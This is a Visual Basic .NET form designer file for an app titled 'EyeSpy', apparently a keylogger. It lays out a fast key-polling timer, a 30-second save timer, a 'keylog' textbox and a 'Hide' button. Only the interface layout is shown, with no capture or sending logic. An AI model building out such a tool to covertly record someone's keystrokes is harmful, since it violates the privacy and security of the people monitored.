<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.keytimer = New System.Windows.Forms.Timer(Me.components)
        Me.savetimer = New System.Windows.Forms.Timer(Me.components)
        Me.keylog = New System.Windows.Forms.TextBox
        Me.Button1 = New System.Windows.Forms.Button
        Me.SuspendLayout()
        '
        'keytimer
        '
        Me.keytimer.Enabled = True
        Me.keytimer.Interval = 5
        '
        'savetimer
        '
        Me.savetimer.Enabled = True
        Me.savetimer.Interval = 30000
        '
        'keylog
        '
        Me.keylog.Location = New System.Drawing.Point(12, 12)
        Me.keylog.Multiline = True
        Me.keylog.Name = "keylog"
        Me.keylog.Size = New System.Drawing.Size(282, 242)
        Me.keylog.TabIndex = 0
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(12, 260)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(282, 28)
        Me.Button1.TabIndex = 1
        Me.Button1.Text = "Hide"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(8.0!, 16.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(306, 297)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.keylog)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "Form1"
        Me.Text = "EyeSpy"
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents keytimer As System.Windows.Forms.Timer
    Friend WithEvents savetimer As System.Windows.Forms.Timer
    Friend WithEvents keylog As System.Windows.Forms.TextBox
    Friend WithEvents Button1 As System.Windows.Forms.Button

End Class
